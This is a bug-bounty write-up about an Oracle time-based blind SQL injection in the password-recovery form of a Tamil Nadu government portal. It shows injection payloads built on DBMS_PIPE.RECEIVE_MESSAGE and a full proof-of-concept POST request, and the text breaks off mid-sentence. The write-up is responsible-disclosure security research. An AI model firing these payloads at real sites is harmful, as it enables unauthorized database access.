---
title: Discovering an Time-Based Blind SQL Injection in a Tamil Nadu Government Web Portal (TANGEDCO)
url: https://infosecwriteups.com/discovering-an-time-based-blind-sql-injection-in-a-tamil-nadu-government-web-portal-tangedco-bbd48e761940?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2026-07-28
fetch_date: 2026-07-29T05:02:51.349776
---

# Discovering an Time-Based Blind SQL Injection in a Tamil Nadu Government Web Portal (TANGEDCO)

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fdiscovering-an-time-based-blind-sql-injection-in-a-tamil-nadu-government-web-portal-tangedco-bbd48e761940&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fdiscovering-an-time-based-blind-sql-injection-in-a-tamil-nadu-government-web-portal-tangedco-bbd48e761940&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-bbd48e761940---------------------------------------)

·

1. [Hunting an Oracle Time-Based Blind SQL Injection: A Real Bug Bounty Journey](/?source=post_page-----bbd48e761940---------------------------------------#5689 "Hunting an Oracle Time-Based Blind SQL Injection: A Real Bug Bounty Journey")
2. [Introduction](/?source=post_page-----bbd48e761940---------------------------------------#7c3a "Introduction")
3. [What is Time-Based Blind SQL Injection?](/?source=post_page-----bbd48e761940---------------------------------------#cf79 "What is Time-Based Blind SQL Injection?")
4. [Finding the Vulnerability](/?source=post_page-----bbd48e761940---------------------------------------#1f3e "Finding the Vulnerability")
5. [POC:](/?source=post_page-----bbd48e761940---------------------------------------#e7bc "POC:")
6. [Verifying the Vulnerability](/?source=post_page-----bbd48e761940---------------------------------------#b367 "Verifying the Vulnerability")
7. [Why This Matters](/?source=post_page-----bbd48e761940---------------------------------------#077a "Why This Matters")
8. [Root Cause](/?source=post_page-----bbd48e761940---------------------------------------#eebc "Root Cause")
9. [Remediation](/?source=post_page-----bbd48e761940---------------------------------------#e57c "Remediation")
10. [Responsible Disclosure](/?source=post_page-----bbd48e761940---------------------------------------#4a50 "Responsible Disclosure")
11. [Key Takeaways](/?source=post_page-----bbd48e761940---------------------------------------#5d10 "Key Takeaways")
12. [About the Author](/?source=post_page-----bbd48e761940---------------------------------------#b9e9 "About the Author")
13. [Connect with me:](/?source=post_page-----bbd48e761940---------------------------------------#1a3f "Connect with me:")

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-bbd48e761940---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Bugbounty

Sql Injection

Cybersecurity

Bug Bounty Tips

# Discovering an Time-Based Blind SQL Injection in a Tamil Nadu Government Web Portal (TANGEDCO)

[![Karthikeyan.V](https://miro.medium.com/v2/resize:fill:64:64/1*7Dwtch8Uu2UNSxmjHtFs8Q.png)](https://medium.com/%40karthithehacker?source=post_page---byline--bbd48e761940---------------------------------------)

[Karthikeyan.V](https://medium.com/%40karthithehacker?source=post_page---byline--bbd48e761940---------------------------------------)

4 min read

·

21 hours ago

--

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3Dbbd48e761940&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fdiscovering-an-time-based-blind-sql-injection-in-a-tamil-nadu-government-web-portal-tangedco-bbd48e761940&source=---header_actions--bbd48e761940---------------------post_audio_button------------------)

Share

Press enter or click to view image in full size

![]()

## Hunting an Oracle Time-Based Blind SQL Injection: A Real Bug Bounty Journey

*By* [*karthithehacker*](https://karthithehacker.com/)

## Introduction

Recently, while performing security testing as part of a bug bounty program, I discovered an **Oracle Time-Based Blind SQL Injection** vulnerability in a web application’s password recovery functionality.

This write-up explains how the vulnerability was identified, how it was verified, why it is dangerous, and what developers can do to prevent similar issues.

> ***Disclaimer:*** *This article has been responsibly disclosed. And for educational purpose only*

## What is Time-Based Blind SQL Injection?

Time-Based Blind SQL Injection occurs when an application does not return database errors or query results directly, but an attacker can infer whether an injected SQL statement executed successfully by measuring the server’s response time.

Oracle databases provide several functions that can intentionally delay execution, making them useful for confirming SQL injection vulnerabilities.

One commonly abused function is:

```
DBMS_PIPE.RECEIVE_MESSAGE('test',5)
```

If the injected query is executed successfully, the application pauses for approximately **5 seconds** before responding.

## Finding the Vulnerability

During testing, I analyzed the application’s **Forgot Password** functionality.

One POST parameter accepted user-controlled input without proper sanitization.

The request structure looked similar to the following:

```
POST /forgotPassword.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
```

```
regcode=<user_input>&emailid=user@example.com
```

After testing various payloads, I injected an Oracle timing function.

Example payload:

```
12345678' AND DBMS_PIPE.RECEIVE_MESSAGE('research',5) IS NOT NULL AND '1'='1
```

Instead of returning an error, the application consistently delayed its response by approximately **5 seconds**.

This behavior strongly indicated that the injected SQL statement was being executed by the backend Oracle database.

## POC:

```
POST /rect17/forgotPassword.php HTTP/1.1
Host: null
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Referer: http://null/rect17/forgotPassword.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 156
Origin: http://null
Connection: close
Cookie: PHPSESSID=null
Upgrade-Insecure-Requests: 1
Priority: u=0, i

&regcode=12345678' AND 3973=DBMS_PIPE.RECEIVE_MESSAGE('karthithehacker', 5) AND 'bug'='bug&emailid=necod73878@jobraux.com&btnSave=Submit&formsubmitted=YES
```

Video poc:

<https://youtu.be/RUVOgD1rWEw>

## Verifying the Vulnerability

To eliminate the possibility of network latency or server performance issues, I repeated the test multiple times.

The results remained consistent:

PayloadResponseNormal requestImmediateSQL payload with delay~5 secondsNormal requestImmediateSQL payload with delay~5 seconds

The predictable delay confirmed that the SQL injection was genuine.

## Why This Matters

Even though this was a **blind** SQL injection, the impa...